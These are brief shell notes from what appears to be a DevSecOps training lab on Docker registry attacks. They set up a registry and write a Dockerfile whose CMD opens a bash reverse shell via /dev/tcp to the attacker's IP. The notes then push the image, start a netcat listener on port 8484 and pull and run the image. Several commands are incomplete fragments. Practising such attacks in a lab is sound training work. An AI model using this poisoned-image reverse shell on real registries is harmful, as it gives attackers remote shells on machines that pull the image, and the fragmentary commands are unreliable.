```shell
docker run -d --name registry -p 80:5000 --restart=always registry:2.7.1
curl -I https://devsecops-box-mjdv10yq.lab.practical-devsecops.training/v2/
git clone cowsay
git build
```

```shell
docker pull
export IP_ADDR=$(ifconfig eth0 | awk 'NR==2 {print $2}')

cat > Dockerfile <<EOF
FROM devsecops-box-mjdv10yq.lab.practical-devsecops.training/django.nv

CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/$IP_ADDR/8484 0>&1"]
EOF

docker build
docker push
apt install netcat -y
nc -lvnp 8484
```

```shell
docker pull
docker run
```


